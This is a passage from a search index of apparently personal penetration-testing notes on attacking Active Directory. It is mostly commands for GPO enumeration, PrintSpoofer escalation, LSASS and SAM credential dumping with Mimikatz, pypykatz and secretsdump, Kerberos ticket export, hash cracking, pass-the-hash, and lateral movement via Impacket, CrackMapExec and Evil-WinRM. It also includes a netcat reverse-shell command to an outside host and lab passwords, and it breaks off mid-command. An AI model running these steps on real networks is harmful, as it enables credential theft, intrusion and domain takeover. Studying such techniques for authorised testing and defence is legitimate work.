name.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#enumerating-gpo-names-with-powerview","title":"Enumerating GPO Names with PowerView","text":"<pre><code>PS &gt; Get-DomainGPO |select displayname\n</code></pre> <p>This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#enumerating-gpo-names-with-a-built-in-cmdlet","title":"Enumerating GPO Names with a Built-In Cmdlet","text":"<pre><code>PS &gt; Get-GPO -All | Select DisplayName\n</code></pre> <p>This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as Get-GPO to perform the same enumeration.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#enumerating-gpo-names-with-a-built-in-cmdlet_1","title":"Enumerating GPO Names with a Built-In Cmdlet","text":"<pre><code>PS &gt; Get-GPO -All | Select DisplayName\n</code></pre> <p>Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#enumerating-domain-user-gpo-rights","title":"Enumerating Domain User GPO Rights","text":"<pre><code>PS &gt; $sid=Convert-NameToSid \"Domain Users\"\nPS &gt; Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}\n</code></pre> <p>Here we can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with Get-GPO to see the display name of the GPO.</p>"},{"location":"zNew/ActiveDirectory/03-AuthenticatedWithValidCredentials/Vulnerabilities/#converting-gpo-guid-to-name","title":"Converting GPO GUID to Name","text":"<pre><code>PS &gt; Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532\n</code></pre>"},{"location":"zNew/ActiveDirectory/04-PrivilegeEscalation/LocalPrivilegeEscalation/","title":"PrintSpoofer [https://github.com/itm4n/PrintSpoofer]","text":"<p>Service Account (IIS/MSSQL) got privilge SeImpersonatePrivilege </p> <p>Create a reverse shell:</p> <p>C:\\TOOLS&gt;PrintSpoofer.exe -c \"C:\\TOOLS\\nc.exe 10.10.13.37 1337 -e cmd\" [+] Found privilege: SeImpersonatePrivilege [+] Named pipe listening... [+] CreateProcessAsUser() OK</p> <p>Netcat listener:</p> <p>C:\\TOOLS&gt;nc.exe -l -p 1337 Microsoft Windows [Version 10.0.19613.1000] (c) 2020 Microsoft Corporation. All rights reserved.</p> <p>C:\\WINDOWS\\system32&gt;whoami nt authority\\system</p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/","title":"Attacking LSA","text":""},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#dumping-lsass-process-memory","title":"Dumping LSASS Process Memory","text":"<p>Similar to the process of attacking the SAM database, with LSASS, it would be wise for us first to create a copy of the contents of LSASS process memory via the generation of a memory dump. Creating a dump file lets us extract credentials offline using our attack host. Keep in mind conducting attacks offline gives us more flexibility in the speed of our attack and requires less time spent on the target system. There are countless methods we can use to create a memory dump. Let's cover techniques that can be performed using tools already built-in to Windows.</p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#task-manager-method","title":"Task Manager Method","text":"<p>Open Task Manager &gt; Select the Processes tab &gt; Find &amp; right click the Local Security Authority Process &gt; Select Create dump file A file called lsass.DMP is created and saved in:  - <code>C:\\Users\\loggedonusersdirectory\\AppData\\Local\\Temp</code></p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#rundll32exe-comsvcsdll-method","title":"Rundll32.exe &amp; Comsvcs.dll Method","text":"<p>The Task Manager method is dependent on us having a GUI-based interactive session with a target. We can use an alternative method to dump LSASS process memory through a command-line utility called rundll32.exe. This way is faster than the Task Manager method and more flexible because we may gain a shell session on a Windows host with only access to the command line. It is important to note that modern anti-virus tools recognize this method as malicious activity.</p> <p>Before issuing the command to create the dump file, we must determine what process ID (PID) is assigned to lsass.exe. This can be done from cmd or PowerShell:</p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#finding-lsass-pid-in-cmd","title":"Finding LSASS PID in cmd","text":"<ul> <li><code>tasklist /svc</code> and find lsass.exe and its process ID in the PID field.</li> </ul>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#finding-lsass-pid-in-powershell","title":"Finding LSASS PID in PowerShell","text":"<p><code>Get-Process lsass</code> and see the process ID in the Id field.</p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#creating-lsassdmp-using-powershell","title":"Creating lsass.dmp using PowerShell","text":"<p>Once we have the PID assigned to the LSASS process, we can create the dump file. With an elevated PowerShell session, we can issue the following command to create the dump file: - <code>rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\lsass.dmp full</code></p> <p>With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\\lsass.dmp). Recall that most modern AV tools recognize this as malicious and prevent the command from executing. In these cases, we will need to consider ways to bypass or disable the AV tool we are facing. AV bypassing techniques are outside of the scope of this module.</p> <p>If we manage to run this command and generate the lsass.dmp file, we can proceed to transfer the file onto our attack box to attempt to extract any credentials that may have been stored in LSASS process memory.</p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#dumping-hashes-offline","title":"Dumping Hashes Offline","text":"<p>Once we have the dump file on our attack host, we can use a powerful tool called pypykatz to attempt to extract credentials from the .dmp file. Pypykatz is an implementation of Mimikatz written entirely in Python. The fact that it is written in Python allows us to run it on Linux-based attack hosts. At the time of this writing, Mimikatz only runs on Windows systems, so to use it, we would either need to use a Windows attack host or we would need to run Mimikatz directly on the target, which is not an ideal scenario. This makes Pypykatz an appealing alternative because all we need is a copy of the dump file, and we can run it offline from our Linux-based attack host.</p> <p>Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a \"snapshot\" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present. Let's run Pypykatz against the dump file and find out. Running Pypykatz</p> <p>The command initiates the use of pypykatz to parse the secrets hidden in the LSASS process memory dump. We use lsa in the command because LSASS is a subsystem of local security authority, then we specify the data source as a minidump file, proceeded by the path to the dump file (/home/peter/Documents/lsass.dmp) stored on our attack host. Pypykatz parses the dump file and outputs the findings:</p> <pre><code>pypykatz lsa minidump /home/peter/Documents/lsass.dmp`\n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#mimikatz","title":"Mimikatz","text":"<pre><code>mimikatz &gt; privilege::debug\nmimikatz &gt; token::elevate\n\n# Dump LSA\nmimikatz &gt; lsadump::secrets\n\n#Dump LSASS:\nmimikatz &gt; sekurlsa::logonpasswords\n\n#Dump and save LSASS in a file\nmimikatz &gt; sekurlsa::minidump c:\\temp\\lsass.dmp\n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#dumping-hashes-remote","title":"Dumping Hashes Remote","text":"<pre><code>$ crackmapexec smb &lt;IP/RANGE&gt; --local-auth -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --lsa\n$ crackmapexec smb &lt;IP/RANGE&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --lsa\n$ secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; \n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingLSA/#cracking-the-nt-hash-with-hashcat","title":"Cracking the NT Hash with Hashcat","text":"<p>Now we can use Hashcat to crack the NT Hash. In this example, we only found one NT hash associated with the Bob user, which means we won't need to create a list of hashes as we did in the Attacking SAM section of this module. After setting the mode in the command, we can paste the hash, specify a wordlist, and then crack the hash.</p> <pre><code>sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt\n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingSAM/","title":"Attacking SAM","text":"<p>With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section. Copying SAM Registry Hives</p> <p>There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below: Registry Hive   Description hklm\\sam    Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. hklm\\system     Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. hklm\\security   Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.</p> <p>We can create backups of these hives using the reg.exe utility.</p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingSAM/#using-regexe-save-to-copy-registry-hives","title":"Using reg.exe save to Copy Registry Hives","text":"<pre><code>reg.exe save hklm\\sam C:\\sam.save\nreg.exe save hklm\\system C:\\system.save\nreg.exe save hklm\\security C:\\security.save\n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingSAM/#dumping-hashes-offline","title":"Dumping Hashes Offline","text":"<p>One incredibly useful tool we can use to dump the hashes offline is Impacket's secretsdump.py. Impacket can be found on most modern penetration testing distributions. We can check for it by using locate on a Linux-based system:</p> <pre><code>$ python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam sam.save -security security.save -system system.save LOCAL\n$ impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL\n\n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingSAM/#mimikatz","title":"Mimikatz","text":"<pre><code>mimikatz &gt; privilege::debug\nmimikatz &gt; token::elevate\nmimikatz &gt; lsadump::sam\n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingSAM/#dumping-hashes-remote","title":"Dumping Hashes Remote","text":"<pre><code>$ crackmapexec smb &lt;IP/RANGE&gt; --local-auth -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --sam`\n$ crackmapexec smb &lt;IP/RANGE&gt; -u &lt;USERNAME&gt; -p &lt;PASSWORD&gt; --sam`\n$ secretsdump.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; \n</code></pre>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/AttackingSAM/#cracking-hashes-with-hashcat","title":"Cracking Hashes with Hashcat","text":"<p>Once we have the hashes, we can start attempting to crack them using Hashcat. We will use it to attempt to crack the hashes we have gathered. If we take a glance at the Hashcat website, we will notice support for a wide array of hashing algorithms. In this module, we use Hashcat for specific use cases. This should help us develop the mindset &amp; understanding to use Hashcat as well as know when we need to reference Hashcat's documentation to understand what mode and options we need to use depending on the hashes we capture.</p> <p>As mentioned previously, we can populate a text file with the NT hashes we were able to dump.</p> <p>Hashcat has many different modes we can use. Selecting a mode is largely dependent on the type of attack and hash type we want to crack. Covering each mode is beyond the scope of this module. We will focus on using -m to select the hash type 1000 to crack our NT hashes (also referred to as NTLM-based hashes). We can refer to Hashcat's wiki page or the man page to see the supported hash types and their associated number. We will use the infamous rockyou.txt wordlist mentioned in the Credential Storage section of this module.</p> <ul> <li><code>sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt</code></li> </ul>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/HarvestingTickets/","title":"Harvesting Kerberos Tickets from Windows","text":"<p>We need a valid Kerberos ticket to perform a Pass the Ticket (PtT). It can be:</p> <pre><code>- `Service Ticket (TGS - Ticket Granting Service) to allow access to a particular resource.`\n- `Ticket Granting Ticket (TGT), which we use to request service tickets to access any resource the user has privileges.`\n</code></pre> <p>Before we perform a Pass the Ticket (PtT) attack, let's see some methods to get a ticket using Mimikatz [https://github.com/ParrotSec/mimikatz] and Rubeus [https://github.com/GhostPack/Rubeus].</p> <p>On Windows, tickets are processed and stored by the LSASS (Local Security Authority Subsystem Service) process. Therefore, to get a ticket from a Windows system, you must communicate with LSASS and request it. As a non-administrative user, you can only get your tickets, but as a local administrator, you can collect everything.</p> <p>We can harvest all tickets from a system using the Mimikatz module sekurlsa::tickets /export. The result is a list of files with the extension .kirbi, which contain the tickets.</p>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/HarvestingTickets/#mimikatz-export-tickets","title":"Mimikatz - Export Tickets","text":"<pre><code>&gt; mimikatz.exe\n&gt; privilege::debug\n&gt; sekurlsa::tickets /export\n&gt; exit\n&gt; dir *.kirbi\n</code></pre> <p>The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain, for example: [randomvalue]-username@service-domain.local.kirbi.</p> <p><code>Note: If you pick a ticket with the service krbtgt, it corresponds to the TGT of that account.</code></p> <ul> <li><code>Note: At the time of writing, using Mimikatz version 2.2.0 20220919, if we run \"sekurlsa::ekeys\" it presents all hashes as des_cbc_md4 on some Windows 10 versions. Exported tickets (sekurlsa::tickets /export) do not work correctly due to the wrong encryption. It is possible to use these hashes to generate new tickets or use Rubeus to export tickets in base64 format.</code></li> </ul>"},{"location":"zNew/ActiveDirectory/05-AdminAccessOnMachine/HarvestingTickets/#rubeus-export-tickets","title":"Rubeus - Export Tickets","text":"<pre><code>&gt; Rubeus.exe dump /nowrap\n</code></pre> <p><code>Note: To collect all tickets we need to execute Mimikatz or Rubeus as an administrator.</code></p> <p>This is a common way to retrieve tickets from a computer. Another advantage of abusing Kerberos tickets is the ability to forge our own tickets. Let's see how we can do this using the OverPass the Hash or Pass the Key technique.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/","title":"Cleartext password","text":""},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#crackmapexec-validating-the-credentials-with-crackmapexec","title":"CrackMapExec Validating the Credentials with CrackMapExec","text":"<pre><code>$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt;\n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt; --local-auth\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#interactive-shell","title":"interactive-shell","text":"<p>Psexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py] One of the most useful tools in the Impacket suite is psexec.py. Psexec.py is a clone of the Sysinternals psexec executable, but works slightly differently from the original. The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Once established, communication happens over a named pipe, providing an interactive remote shell as SYSTEM on the victim host.</p> <p>To connect to a host with psexec.py, we need credentials for a user with local administrator privileges.</p> <pre><code>$ psexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n</code></pre> <p>Mimikatz</p> <pre><code>&gt; kerberos::hash /password:lucky7\n\n&gt; mimikatz.exe\n# privilege::debug \n# sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#pseudo-shell-file-write-and-read","title":"pseudo-shell (file write and read)","text":""},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#impacket-toolkit","title":"Impacket Toolkit","text":"<p>Atexec.py [https://github.com/fortra/impacket/blob/master/examples/atexec.py]</p> <pre><code>$ atexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt; \"command\" \n</code></pre> <p>Smbexec.py [https://github.com/fortra/impacket/blob/master/examples/smbexec.py]</p> <pre><code>$ smbexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n</code></pre> <p>Wmiexec.py [https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py] Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation. It does not drop any files or executables on the target host and generates fewer logs than other modules. After connecting, it runs as the local admin user we connected with (this can be less obvious to someone hunting for an intrusion than seeing SYSTEM executing many commands). This is a more stealthy approach to execution on hosts than other tools, but would still likely be caught by most modern anti-virus and EDR systems. We will use the same account as with psexec.py to access the host.</p> <pre><code>$ wmiexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n</code></pre> <p>Dcomexec.py [https://github.com/fortra/impacket/blob/master/examples/dcomexec.py]</p> <pre><code>$ dcomexec.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n</code></pre> <p>CrackMapExec</p> <pre><code>$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt; password&gt; -d &lt;domain&gt;\n$ crackmapexec smb &lt;ip_range&gt; -u &lt;user&gt; -p &lt; password&gt; -local-auth\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#winrm","title":"WinRM","text":"<p>Enumerating the Remote Management Users Group</p> <pre><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Management Users\"\n</code></pre> <p>Using the Cypher Query in BloodHound</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>Establishing WinRM Session from Windows</p> <pre><code>$password = ConvertTo-SecureString \"Klmcargo2\" -AsPlainText -Force\n$cred = new-object System.Management.Automation.PSCredential (\"INLANEFREIGHT\\forend\", $password)\nEnter-PSSession -ComputerName ACADEMY-EA-DB01 -Credential $cred\n</code></pre> <p>Connecting to a Target with Evil-WinRM and Valid Credentials</p> <pre><code>$ evil-winrm -i &lt;ip&gt; -u &lt;user&gt; -p &lt;password&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#rdp","title":"RDP","text":"<p>Enumerating the Remote Desktop Users Group</p> <pre><code>Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName \"Remote Desktop Users\"\n</code></pre> <p>Checking the Domain Users Group's Local Admin &amp; Execution Rights using BloodHound If we gain control over a user through an attack such as LLMNR/NBT-NS Response Spoofing or Kerberoasting, we can search for the username in BloodHound to check what type of remote access rights they have either directly or inherited via group membership under Execution Rights on the Node Info tab.</p> <p>We could also check the Analysis tab and run the pre-built queries Find Workstations where Domain Users can RDP or Find Servers where Domain Users can RDP</p> <pre><code>$ xfreerdp/u:&lt;user&gt; /d:&lt;domain&gt; /p:&lt;password&gt;/v:&lt;ip&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#smb","title":"SMB","text":"<pre><code>$ smbclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#mssql","title":"MSSQL","text":"<pre><code>$ crackmapexec mssql &lt;ip_range&gt; -u &lt;user&gt; -p &lt;password&gt;\n$ mssqlclient.py -windows-auth &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n$ mssqlclient.py &lt;domain&gt;/&lt;user&gt;:&lt;password&gt;@&lt;ip&gt;\n</code></pre> <p>More often than not, we will encounter SQL servers in the environments we face. It is common to find user and service accounts set up with sysadmin privileges on a given SQL server instance. We may obtain credentials for an account with this access via Kerberoasting (common) or others such as LLMNR/NBT-NS Response Spoofing or password spraying. Another way that you may find SQL server credentials is using the tool Snaffler to find web.config or other types of configuration files that contain SQL server connection strings.</p> <p>BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search:</p> <p>Using a Custom Cypher Query to Check for SQL Admin Rights in BloodHound</p> <pre><code>MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]-&gt;(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]-&gt;(c:Computer) RETURN p2\n</code></pre> <p>Enumerating MSSQL Instances with PowerUpSQL</p> <pre><code>Import-Module .\\PowerUpSQL.ps1\nGet-SQLInstanceDomain\n</code></pre> <pre><code>Get-SQLQuery -Verbose -Instance \"172.16.5.150,1433\" -username \"inlanefreight\\damundsen\" -password \"SQL1234!\" -query 'Select @@version'\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/ClearTextPassword/#running-mssqlclientpy-against-the-target","title":"Running mssqlclient.py Against the Target","text":"<pre><code>$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth\n$ mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150\n</code></pre> <p>We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure which allows for one to execute operating system commands via the database if the account in question has the proper access rights. Choosing enable_xp_cmdshell</p> <pre><code>enable_xp_cmdshell\n</code></pre> <pre><code>xp_cmdshell whoami /priv\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/LateralMovement/","title":"Lateral Movement","text":""},{"location":"zNew/ActiveDirectory/06-LateralMovement/LateralMovement/#impacket-toolkit","title":"Impacket Toolkit","text":""},{"location":"zNew/ActiveDirectory/06-LateralMovement/LateralMovement/#privileged-access","title":"Privileged Access","text":"<p>Once we gain a foothold in the domain, our goal shifts to advancing our position further by moving laterally or vertically to obtain access to other hosts, and eventually achieve domain compromise or some other goal, depending on the aim of the assessment. To achieve this, there are several ways we can move laterally. Typically, if we take over an account with local admin rights over a host, or set of hosts, we can perform a Pass-the-Hash attack to authenticate via the SMB protocol.</p> <p>But what if we don't yet have local admin rights on any hosts in the domain?</p> <p>There are several other ways we can move around a Windows domain:</p> <ul> <li> <p>Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host</p> </li> <li> <p>PowerShell Remoting - also referred to as PSRemoting or Windows Remote Management (WinRM) access, is a remote access protocol that allows us to run commands or enter an interactive command-line session on a remote host using PowerShell</p> </li> <li> <p>MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance remotely and execute queries against the database. This access can be used to run operating system commands in the context of the SQL Server service account through various methods</p> </li> </ul>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/LateralMovement/#kerberos-double-hop-problem","title":"Kerberos \"Double Hop\" Problem","text":"<p>There's an issue known as the \"Double Hop\" problem that arises when an attacker attempts to use Kerberos authentication across two (or more) hops. The issue concerns how Kerberos tickets are granted for specific resources. Kerberos tickets should not be viewed as passwords. They are signed pieces of data from the KDC that state what resources an account can access. When we perform Kerberos authentication, we get a \"ticket\" that permits us to access the requested resource (i.e., a single machine). On the contrary, when we use a password to authenticate, that NTLM hash is stored in our session and can be used elsewhere without issue.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/LateralMovement/#background","title":"Background","text":"<p>The \"Double Hop\" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides a ticket to access a specific resource. This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. In this situation, the user account being used has the rights to perform an action but is denied access. The most common way to get shells is by attacking an application on the target host or using credentials and a tool such as PSExec. In both of these scenarios, the initial authentication was likely performed over SMB or LDAP, which means the user's NTLM Hash would be stored in memory. Sometimes we have a set of credentials and are restricted to a particular method of authentication, such as WinRM, or would prefer to use WinRM for any number of reasons.</p> <p>The crux of the issue is that when using WinRM to authenticate over two or more connections, the user's password is never cached as part of their login. If we use Mimikatz to look at the session, we'll see that all credentials are blank. As stated previously, when we use Kerberos to establish a remote session, we are not using a password for authentication. When password authentication is used, with PSExec, for example, that NTLM hash is stored in the session, so when we go to access another resource, the machine can pull the hash from memory and authenticate us.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/LateralMovement/#workaround-1-pscredential-object","title":"Workaround #1: PSCredential Object","text":"<pre><code>*Evil-WinRM* PS &gt; $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force\n*Evil-WinRM* PS &gt; $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\\backupadm', $SecPassword)\n*Evil-WinRM* PS &gt; get-domainuser -spn -credential $Cred | select samaccountname\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/LateralMovement/#workaround-2-register-pssession-configuration","title":"Workaround #2: Register PSSession Configuration","text":"<pre><code>PS &gt; Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\\backupadm\n</code></pre> <p>Once this is done, we need to restart the WinRM service by typing Restart-Service WinRM in our current PSSession. This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.</p> <p>After we start the session, we can see that the double hop problem has been eliminated, and if we type klist, we'll have the cached tickets necessary to reach the Domain Controller. This works because our local machine will now impersonate the remote machine in the context of the backupadm user and all requests from our local machine will be sent directly to the Domain Controller.</p> <pre><code>PS &gt; Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\\backupadm -ConfigurationName  backupadmsess\n[DEV01]: PS C:\\Users\\backupadm\\Documents&gt; klist\n</code></pre> <p>We can now run tools such as PowerView without having to create a new PSCredential object.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/","title":"Pass the Hash (PtH)","text":"<p>A Pass the Hash (PtH) attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn't need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.</p> <p>As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:</p> <ul> <li>Dumping the local SAM database from a compromised host.</li> <li>Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.</li> <li>Pulling the hashes from memory (lsass.exe).</li> </ul>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#windows-ntlm-introduction","title":"Windows NTLM Introduction","text":"<p>Microsoft's Windows New Technology LAN Manager (NTLM) is a set of security protocols that authenticates users' identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user's identity without having them provide a password.</p> <p>Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.</p> <p>With NTLM, passwords stored on the server and domain controller are not \"salted,\" which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a Pass the Hash (PtH) Attack.</p>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#interactive-shell","title":"interactive-shell","text":"<p>Pass the Hash with Impacket PsExec</p> <pre><code>impacket-psexec -hashes \":&lt;hash&gt;\"&lt;user&gt;@&lt;ip&gt;`\npsexec.py -hashes \":&lt;hash&gt;\"&lt;user&gt;@&lt;ip&gt;\n</code></pre> <p>Pass the Hash with Mimikatz Mimikatz has a module named sekurlsa::pth that allows us to perform a Pass the Hash attack by starting a process using the hash of the user's password. To use this module, we will need the following:</p> <pre><code>/user - The user name we want to impersonate.\n/rc4 or /NTLM - NTLM hash of the user's password.\n/domain - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).\n/run - The program we want to run with the user's context (if not specified, it will launch cmd.exe).\n</code></pre> <pre><code>.\\mimikatz \"privilege::debug sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:cmd.exe\"\n</code></pre>"},{"location":"zNew/ActiveDirectory/06-LateralMovement/PassTheHash/#pass-the-hash-with-powershell-invoke-thehash","title":"Pass the Hash with PowerShell Invoke-TheHash","text":"<p>Another tool we can use to perform Pass the Hash attacks on Windows is Invoke-TheHash. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. </p> <p>When using Invoke-TheHash, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:</p> <pre><code>Target - Hostname or IP address of the target.\nUsername - Username to use for authentication.\nDomain - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.\nHash - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.\nCommand - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.\n</code></pre> <p>The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.</p> <p>Invoke-TheHash with SMB</p> <pre><code>Import-Module .\\Invoke-TheHash.psd1\nInvoke-SMBExec -Target 10.129.186.240 